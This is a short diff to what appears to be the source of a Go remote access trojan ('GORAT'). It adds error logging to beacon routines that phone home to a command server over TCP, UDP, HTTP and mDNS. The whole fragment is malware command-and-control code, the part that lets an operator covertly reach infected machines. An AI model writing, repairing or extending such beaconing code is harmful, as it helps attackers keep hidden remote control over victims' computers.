@@ -78,12 +78,20 @@ func main() {
 		switch Core.BACON_TYPE {
 		case "tcp":
 			tcp_connection, derp := Beacons.BaconTCP(Core.PHONEHOME_TCP)
+			if derp != nil {
+				ErrorHandling.RatLogError(derp, "[-] Beacon TCP failed to connect to command, stopping beacon")
+			}
 		case "udp":
-			Beacons.BeaconUDP(Core.PHONEHOME_UDP)
+			udp_conn, derp := Beacons.BeaconUDP(Core.PHONEHOME_UDP)
+			if derp != nil {
+				ErrorHandling.RatLogError(derp, "[-] Beacon UDP failed to connect to command, stopping beacon")
+			}
 		case "http":
 			// function to call other beacons depending on second param
 			http_response, derp := Beacons.BeaconHTTP(Core.Remote_http_addr, Core.BEACONHTTPTYPE)
-
+			if derp != nil {
+				ErrorHandling.RatLogError(derp, "[-] HTTP Error:")
+			}
 		case "mdns":
 			// Setup our service export
 			servicename := "GORAT!"
